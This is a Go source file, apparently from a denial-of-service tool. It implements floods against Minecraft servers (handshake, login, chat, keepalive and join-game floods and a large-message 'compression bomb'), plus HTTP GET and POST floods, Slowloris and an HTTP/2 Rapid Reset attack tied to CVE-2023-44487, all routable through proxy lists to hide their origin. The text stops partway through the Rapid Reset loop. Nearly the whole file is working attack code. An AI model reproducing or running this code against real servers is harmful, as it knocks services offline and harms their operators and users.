package main

import (
	"bufio"
	"bytes"
	crand "crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	mrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
}

func randUA() string {
	return userAgents[int(rd.Int63n(int64(len(userAgents))))]
}

// Minecraft packet IDs
const (
	packetHandshake       = 0x00
	packetStatusRequest   = 0x00
	packetStatusPing      = 0x01
	packetStatusResponse  = 0x00
	packetStatusPong      = 0x01
	packetLoginStart      = 0x00
	packetLoginPluginAck  = 0x03
	packetPlaySimple      = 0x00
	packetPlayChat        = 0x03
	packetPlayKeepAlive   = 0x10
	packetPlayChatCommand = 0x04
	packetPlayChatAck     = 0x05
	packetPlayChatPreview = 0x06
	packetPlayChatMessage = 0x07
	packetPlayPlayerAction = 0x08
	packetPlayPing        = 0x0F
	packetPlayClientTickEnd = 0x11
	packetPlayEntityAction = 0x12
	packetPlayInput       = 0x13
	packetPlayContainerClick = 0x14
	packetPlayContainerClose = 0x15
	packetPlayContainerConfirm = 0x16
)

// VarInt utilities
func writeVarInt(buf *bytes.Buffer, value int) {
	for {
		if (value & ^0x7F) == 0 {
			buf.WriteByte(byte(value))
			return
		} else {
			buf.WriteByte(byte((value & 0x7F) | 0x80))
			value >>= 7
		}
	}
}

func readVarInt(data []byte) (int, int) {
	result := 0
	count := 0
	for {
		if count >= len(data) {
			return 0, 0
		}
		b := data[count]
		count++
		result |= int(b&0x7F) << (7 * (count - 1))
		if (b & 0x80) == 0 {
			break
		}
	}
	return result, count
}

// Global atomic counters
var totalSent atomic.Int64
var totalErrors atomic.Int64
var totalNonSucc atomic.Int64
var proxyList []string // Set in main, used by some methods

var rd = mrand.New(mrand.NewSource(time.Now().UnixNano()))

// Configuration constants
const (
	dialTimeout           = 5 * time.Second
	responseHeaderTimeout = 10 * time.Second
	clientTimeout         = 10 * time.Second
	keepAliveInterval     = 30 * time.Second
	idleConnTimeout       = 90 * time.Second
	maxIdleConns          = 500
	maxIdleConnsPerHost   = 250
	maxConnsPerHost       = 250
	maxClientsPerProxy    = 64
	maxDirectPool         = 256
)

func newTransport(proxyURL *url.URL) *http.Transport {
	t := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   dialTimeout,
			KeepAlive: keepAliveInterval,
		}).DialContext,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
		TLSHandshakeTimeout:  dialTimeout,
		MaxIdleConns:         maxIdleConns,
		MaxIdleConnsPerHost:   maxIdleConnsPerHost,
		MaxConnsPerHost:     maxConnsPerHost,
		IdleConnTimeout:       idleConnTimeout,
		ResponseHeaderTimeout: responseHeaderTimeout,
		DisableKeepAlives:     false,
		DisableCompression:    true,
		ForceAttemptHTTP2:     false,
	}
	if proxyURL != nil {
		t.Proxy = http.ProxyURL(proxyURL)
	}
	return t
}

func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
	seen := make(map[string]bool)
	var unique []string
	for _, p := range proxies {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}

	clientsPerProxy := workers / len(unique)
	if clientsPerProxy < 1 {
		clientsPerProxy = 1
	}
	if clientsPerProxy > maxClientsPerProxy {
		clientsPerProxy = maxClientsPerProxy
	}

	clients := make([]*http.Client, 0, len(unique)*clientsPerProxy)
	for _, raw := range unique {
		proxyURL, err := url.Parse(raw)
		if err != nil {
			log.Printf("skipping bad proxy %s: %v", raw, err)
			continue
		}
		for i := 0; i < clientsPerProxy; i++ {
			c := &http.Client{
				Transport: newTransport(proxyURL),
				Timeout:   clientTimeout,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					if len(via) >= 3 {
						return http.ErrUseLastResponse
					}
					return nil
				},
			}
			clients = append(clients, c)
		}
	}
	if len(clients) == 0 {
		return nil, fmt.Errorf("no valid proxy clients built")
	}
	return clients, nil
}

func buildDirectPool(count int) []*http.Client {
	clients := make([]*http.Client, 0, count)
	for i := 0; i < count; i++ {
		c := &http.Client{
			Transport: newTransport(nil),
			Timeout:   clientTimeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 3 {
					return http.ErrUseLastResponse
				}
				return nil
			},
		}
		clients = append(clients, c)
	}
	return clients
}

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("open proxy file: %w", err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if line := strings.TrimSpace(scanner.Text()); line != "" {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("read proxy file: %w", err)
	}
	if len(lines) == 0 {
		return nil, fmt.Errorf("no proxies found in %s", filename)
	}
	return lines, nil
}

// ======================== Minecraft Methods ========================

// Minecraft Handshake Flood
func mcHandshakeFlood(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		// Create raw TCP connection
		var conn net.Conn
		var err error

		if proxyURL != nil {
			// Proxy CONNECT tunnel
			conn, err = net.DialTimeout("tcp", proxyURL.Host, dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}

			// Send CONNECT request
			connectReq := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n", host, port, host, port)
			if proxyURL.User != nil {
				user := proxyURL.User.Username()
				pass, _ := proxyURL.User.Password()
				cred := encodeBase64(fmt.Sprintf("%s:%s", user, pass))
				connectReq += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", cred)
			}
			connectReq += "\r\n"

			if _, err := conn.Write([]byte(connectReq)); err != nil {
				conn.Close()
				totalErrors.Add(1)
				continue
			}

			// Read CONNECT response
			br := bufio.NewReader(conn)
			resp, err := http.ReadResponse(br, nil)
			if err != nil || resp.StatusCode != 20 {
				conn.Close()
				totalErrors.Add(1)
				continue
			}
			resp.Body.Close()
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Build Minecraft handshake packet
		var packet bytes.Buffer

		// Protocol version (random)
		writeVarInt(&packet, int(rd.Int63n(1000)))

		// Server host (random length string)
		serverHost := generateRandomString(10 + int(rd.Int63n(50)))
		writeVarInt(&packet, len(serverHost))
		packet.WriteString(serverHost)

		// Server port
		packet.WriteByte(0) // Just use 0
		binary.Write(&packet, binary.BigEndian, uint16(port))

		// Next state (always 1 = status in this case to trigger status flood)
		writeVarInt(&packet, 1)

		// Prepend length
		var finalPacket bytes.Buffer
		writeVarInt(&finalPacket, packet.Len())
		finalPacket.Write(packet.Bytes())

		// Send packet
		if _, err := conn.Write(finalPacket.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		totalSent.Add(1)
		conn.Close()
	}
	return nil
}

// Minecraft Status Ping Flood
func mcStatusPingFlood(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		var conn net.Conn
		var err error

		if proxyURL != nil {
			conn, err = connectThroughProxy(proxyURL.Host, host, port)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Send Status Request packet
		var request bytes.Buffer
		writeVarInt(&request, packetStatusRequest) // Packet ID
		var outerRequest bytes.Buffer
		writeVarInt(&outerRequest, request.Len())
		outerRequest.Write(request.Bytes())

		if _, err := conn.Write(outerRequest.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Read response (ignore)
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		br := bufio.NewReader(conn)
		_, err = br.ReadBytes('\n') // Just wait for any response
		conn.SetDeadline(time.Time{})

		totalSent.Add(1)
		conn.Close()
	}
	return nil
}

// Minecraft Login Flood
func mcLoginFlood(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		var conn net.Conn
		var err error

		if proxyURL != nil {
			conn, err = connectThroughProxy(proxyURL.Host, host, port)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Send Handshake packet to switch to login state
		var handshake bytes.Buffer
		writeVarInt(&handshake, 0x47) // Protocol version 71+ (1.8)
		writeVarString(&handshake, host)
		writeVarInt(&handshake, 2) // Next state = 2 (login)

		var hsOuter bytes.Buffer
		writeVarInt(&hsOuter, handshake.Len())
		hsOuter.WriteByte(packetHandshake) // Packet ID
		hsOuter.Write(handshake.Bytes())

		// Wrap in length-prefixed packet
		var packetHS bytes.Buffer
		writeVarInt(&packetHS, hsOuter.Len())
		packetHS.Write(hsOuter.Bytes())

		if _, err := conn.Write(packetHS.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Now send Login Start packet
		var loginStart bytes.Buffer
		writeVarString(&loginStart, generateRandomString(10+int(rd.Int63n(20)))) // Player name
		writeVarInt(&loginStart, 0) // UUID (0)

		var loginOuter bytes.Buffer
		writeVarInt(&loginOuter, packetLoginStart) // Packet ID
		loginOuter.Write(loginStart.Bytes())

		var loginPacket bytes.Buffer
		writeVarInt(&loginPacket, loginOuter.Len())
		loginPacket.Write(loginOuter.Bytes())

		if _, err := conn.Write(loginPacket.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		totalSent.Add(1)
		conn.Close()
	}
	return nil
}

// Minecraft Chat Flood
func mcChatFlood(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		var conn net.Conn
		var err error

		if proxyURL != nil {
			conn, err = connectThroughProxy(proxyURL.Host, host, port)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Send Handshake packet to switch to login state
		var handshake bytes.Buffer
		writeVarInt(&handshake, 0x47)
		writeVarString(&handshake, host)
		writeVarInt(&handshake, 2) // Next state = 2 (login)

		var hsOuter bytes.Buffer
		writeVarInt(&hsOuter, handshake.Len())
		hsOuter.WriteByte(packetHandshake)
		hsOuter.Write(handshake.Bytes())

		var packetHS bytes.Buffer
		writeVarInt(&packetHS, hsOuter.Len())
		packetHS.Write(hsOuter.Bytes())

		if _, err := conn.Write(packetHS.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send Login Start packet
		var loginStart bytes.Buffer
		writeVarString(&loginStart, generateRandomString(10+int(rd.Int63n(20))))
		writeVarInt(&loginStart, 0)

		var loginOuter bytes.Buffer
		writeVarInt(&loginOuter, packetLoginStart)
		loginOuter.Write(loginStart.Bytes())

		var loginPacket bytes.Buffer
		writeVarInt(&loginPacket, loginOuter.Len())
		loginPacket.Write(loginOuter.Bytes())

		if _, err := conn.Write(loginPacket.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send multiple chat messages rapidly
		for i := 0; i < 10; i++ {
			var chat bytes.Buffer
			writeVarString(&chat, generateRandomString(50+int(rd.Int63n(200))))

			var chatOuter bytes.Buffer
			writeVarInt(&chatOuter, packetPlayChat) // Packet ID
			chatOuter.Write(chat.Bytes())

			var chatPacket bytes.Buffer
			writeVarInt(&chatPacket, chatOuter.Len())
			chatPacket.Write(chatOuter.Bytes())

			if _, err := conn.Write(chatPacket.Bytes()); err != nil {
				conn.Close()
				totalErrors.Add(1)
				continue
			}

			totalSent.Add(1)
		}

		conn.Close()
	}
	return nil
}

// Minecraft Keepalive Flood
func mcKeepAliveFlood(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		var conn net.Conn
		var err error

		if proxyURL != nil {
			conn, err = connectThroughProxy(proxyURL.Host, host, port)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Send Handshake packet
		var handshake bytes.Buffer
		writeVarInt(&handshake, 0x47)
		writeVarString(&handshake, host)
		writeVarInt(&handshake, 2) // Next state = 2 (login)

		var hsOuter bytes.Buffer
		writeVarInt(&hsOuter, handshake.Len())
		hsOuter.WriteByte(packetHandshake)
		hsOuter.Write(handshake.Bytes())

		var packetHS bytes.Buffer
		writeVarInt(&packetHS, hsOuter.Len())
		packetHS.Write(hsOuter.Bytes())

		if _, err := conn.Write(packetHS.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send Login Start packet
		var loginStart bytes.Buffer
		writeVarString(&loginStart, generateRandomString(10+int(rd.Int63n(20))))
		writeVarInt(&loginStart, 0)

		var loginOuter bytes.Buffer
		writeVarInt(&loginOuter, packetLoginStart)
		loginOuter.Write(loginStart.Bytes())

		var loginPacket bytes.Buffer
		writeVarInt(&loginPacket, loginOuter.Len())
		loginPacket.Write(loginOuter.Bytes())

		if _, err := conn.Write(loginPacket.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send multiple keepalive packets
		for i := 0; i < 50; i++ {
			var keepalive bytes.Buffer
			writeVarInt(&keepalive, packetPlayKeepAlive) // Packet ID
			binary.Write(&keepalive, binary.BigEndian, int64(rd.Int63n(99999)))

			var kaOuter bytes.Buffer
			writeVarInt(&kaOuter, keepalive.Len())
			kaOuter.Write(keepalive.Bytes())

			if _, err := conn.Write(kaOuter.Bytes()); err != nil {
				conn.Close()
				totalErrors.Add(1)
				continue
			}

			totalSent.Add(1)
		}

		conn.Close()
	}
	return nil
}

// Minecraft Compression Bomb
func mcCompressionBomb(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		var conn net.Conn
		var err error

		if proxyURL != nil {
			conn, err = connectThroughProxy(proxyURL.Host, host, port)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Send Handshake packet
		var handshake bytes.Buffer
		writeVarInt(&handshake, 0x47)
		writeVarString(&handshake, host)
		writeVarInt(&handshake, 2) // Next state = 2 (login)

		var hsOuter bytes.Buffer
		writeVarInt(&hsOuter, handshake.Len())
		hsOuter.WriteByte(packetHandshake)
		hsOuter.Write(handshake.Bytes())

		var packetHS bytes.Buffer
		writeVarInt(&packetHS, hsOuter.Len())
		packetHS.Write(hsOuter.Bytes())

		if _, err := conn.Write(packetHS.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send Login Start packet
		var loginStart bytes.Buffer
		writeVarString(&loginStart, generateRandomString(10+int(rd.Int63n(20))))
		writeVarInt(&loginStart, 0)

		var loginOuter bytes.Buffer
		writeVarInt(&loginOuter, packetLoginStart)
		loginOuter.Write(loginStart.Bytes())

		var loginPacket bytes.Buffer
		writeVarInt(&loginPacket, loginOuter.Len())
		loginPacket.Write(loginOuter.Bytes())

		if _, err := conn.Write(loginPacket.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send massive chat messages to trigger compression issues
		for i := 0; i < 5; i++ {
			var chat bytes.Buffer
			// Create a very large chat message (compression bomb)
			largeMsg := strings.Repeat("A", 1024*1024) // 1MB of data
			writeVarString(&chat, largeMsg)

			var chatOuter bytes.Buffer
			writeVarInt(&chatOuter, packetPlayChat)
			chatOuter.Write(chat.Bytes())

			var chatPacket bytes.Buffer
			writeVarInt(&chatPacket, chatOuter.Len())
			chatPacket.Write(chatOuter.Bytes())

			if _, err := conn.Write(chatPacket.Bytes()); err != nil {
				conn.Close()
				totalErrors.Add(1)
				continue
			}

			totalSent.Add(1)
		}

		conn.Close()
	}
	return nil
}

// Minecraft Join Game Flood
func mcJoinGameFlood(target string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(target)
	if err != nil {
		return err
	}

	host := u.Hostname()
	portStr := u.Port()
	if portStr == "" {
		portStr = "25565"
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return err
	}

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	for {
		select {
		case <-stop:
			return nil
		default:
		}

		var conn net.Conn
		var err error

		if proxyURL != nil {
			conn, err = connectThroughProxy(proxyURL.Host, host, port)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		} else {
			conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), dialTimeout)
			if err != nil {
				totalErrors.Add(1)
				continue
			}
		}

		// Send Handshake packet
		var handshake bytes.Buffer
		writeVarInt(&handshake, 0x47)
		writeVarString(&handshake, host)
		writeVarInt(&handshake, 2) // Next state = 2 (login)

		var hsOuter bytes.Buffer
		writeVarInt(&hsOuter, handshake.Len())
		hsOuter.WriteByte(packetHandshake)
		hsOuter.Write(handshake.Bytes())

		var packetHS bytes.Buffer
		writeVarInt(&packetHS, hsOuter.Len())
		packetHS.Write(hsOuter.Bytes())

		if _, err := conn.Write(packetHS.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send Login Start packet
		var loginStart bytes.Buffer
		writeVarString(&loginStart, generateRandomString(10+int(rd.Int63n(20))))
		writeVarInt(&loginStart, 0)

		var loginOuter bytes.Buffer
		writeVarInt(&loginOuter, packetLoginStart)
		loginOuter.Write(loginStart.Bytes())

		var loginPacket bytes.Buffer
		writeVarInt(&loginPacket, loginOuter.Len())
		loginPacket.Write(loginOuter.Bytes())

		if _, err := conn.Write(loginPacket.Bytes()); err != nil {
			conn.Close()
			totalErrors.Add(1)
			continue
		}

		// Send Join Game packets rapidly
		for i := 0; i < 100; i++ {
			var joinGame bytes.Buffer
			writeVarInt(&joinGame, packetPlaySimple) // Packet ID
			writeVarInt(&joinGame, 0) // Entity ID
			writeVarInt(&joinGame, 1) // Gamemode
			writeVarInt(&joinGame, 0) // Previous Gamemode
			writeVarInt(&joinGame, 0) // World Names length
			writeVarInt(&joinGame, 1) // Dimension count
			writeVarInt(&joinGame, 0) // Dimension codec
			writeVarInt(&joinGame, 1) // Dimension name
			writeVarString(&joinGame, "minecraft:overworld") // Dimension
			writeVarString(&joinGame, "minecraft:overworld") // Level name
			binary.Write(&joinGame, binary.BigEndian, uint8(0)) // View distance
			binary.Write(&joinGame, binary.BigEndian, uint8(0)) // Simulation distance

			var jgOuter bytes.Buffer
			writeVarInt(&jgOuter, joinGame.Len())
			jgOuter.Write(joinGame.Bytes())

			if _, err := conn.Write(jgOuter.Bytes()); err != nil {
				conn.Close()
				totalErrors.Add(1)
				continue
			}

			totalSent.Add(1)
		}

		conn.Close()
	}
	return nil
}

// Helper function to write VarInt and VarString
func writeVarString(buf *bytes.Buffer, s string) {
	writeVarInt(buf, len(s))
	buf.WriteString(s)
}

// Helper function to encode base64 (simple implementation)
func encodeBase64(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

// Helper function to connect through a proxy
func connectThroughProxy(proxyHost, targetHost string, targetPort int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxyHost, dialTimeout)
	if err != nil {
		return nil, err
	}

	// Send CONNECT request
	connectReq := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n",
		targetHost, targetPort, targetHost, targetPort)

	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, err
	}

	// Read response
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp.Body.Close()

	if resp.StatusCode != 200 {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed with status %d", resp.StatusCode)
	}

	return conn, nil
}

// Generate random string
func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[int(rd.Int63n(int64(len(charset))))]
	}
	return string(b)
}

// ======================== Layer 7 DDoS Methods ========================

func httpGet(targetURL string, client *http.Client) error {
	resp, err := client.Get(targetURL)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		totalNonSucc.Add(1)
	}
	return nil
}

func httpPost(targetURL string, client *http.Client) error {
	// Random payload generation
	body := generateRandomString(50 + int(rd.Int63n(500)))
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Content-Length", strconv.Itoa(len(body)))
	req.Header.Set("User-Agent", randUA())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		totalNonSucc.Add(1)
	}
	return nil
}

func httpSlowloris(targetURL string, client *http.Client, stop <-chan struct{}) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return err
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	portInt, _ := strconv.Atoi(port)

	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	var conn net.Conn
	var err2 error

	if proxyURL != nil {
		conn, err2 = connectThroughProxy(proxyURL.Host, host, portInt)
		if err2 != nil {
			return err2
		}
	} else {
		conn, err2 = net.DialTimeout("tcp", fmt.Sprintf("%s:%s", host, port), dialTimeout)
		if err2 != nil {
			return err2
		}
	}

	defer conn.Close()

	// Send partial HTTP request
	path := u.Path
	if path == "" {
		path = "/"
	}

	requestLine := fmt.Sprintf("GET %s?%s HTTP/1.1\r\n", path, generateRandomString(20+int(rd.Int63n(100))))
	headers := fmt.Sprintf("Host: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n", host, randUA())

	if _, err := conn.Write([]byte(requestLine)); err != nil {
		return err
	}
	if _, err := conn.Write([]byte(headers)); err != nil {
		return err
	}

	// Keep connection open by sending headers periodically
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			return nil
		case <-ticker.C:
			// Send a custom header to keep connection alive
			header := fmt.Sprintf("X-Keep-Alive: %s\r\n", generateRandomString(50+int(rd.Int63n(100))))
			if _, err := conn.Write([]byte(header)); err != nil {
				return err
			}
			totalSent.Add(1)
		}
	}
}

// HTTP/2 Rapid Reset (CVE-2023-44487)
func httpRapidReset(targetURL string, stop <-chan struct{}) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return err
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	addr := net.JoinHostPort(host, port)

	// Dial — through proxy CONNECT tunnel or direct
	var rawConn net.Conn
	if len(proxyList) > 0 {
		proxy := proxyList[int(rd.Int63n(int64(len(proxyList))))]
		pURL, _ := url.Parse(proxy)

		rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
		if err != nil {
			return err
		}

		// build CONNECT request
		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", addr, addr)
		if pURL.User != nil {
			user := pURL.User.Username()
			pass, _ := pURL.User.Password()
			cred := encodeBase64(fmt.Sprintf("%s:%s", user, pass))
			connectReq += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", cred)
		}
		connectReq += "\r\n"

		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
			rawConn.Close()
			return err
		}

		br := bufio.NewReader(rawConn)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			rawConn.Close()
			return fmt.Errorf("CONNECT failed: %w", err)
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			rawConn.Close()
			return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
		}
	} else {
		rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			return err
		}
	}

	// TLS handshake with ALPN h2
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()

	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}

	// HTTP/2 client connection preface
	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return err
	}

	// Buffered framer — batch frames before flushing to wire
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true

	// Send initial SETTINGS
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	)
	bw.Flush()

	// Background reader — consume server frames so the connection doesn't stall
	connDone := make(chan struct{})
	go func() {
		defer close(connDone)
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			switch sf := f.(type) {
			case *http2.SettingsFrame:
				if !sf.IsAck() {
					framer.WriteSettingsAck()
					bw.Flush()
				}
			case *http2.GoAwayFrame:
				return // server rejected us
			}
		}
	}()

	// HPACK encoder for pseudo-headers
	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	var streamID uint32 = 1
	const batchSize = 100 // flush every 100 HEADERS+RST pairs

	for {
		select {
		case <-stop:
			return nil
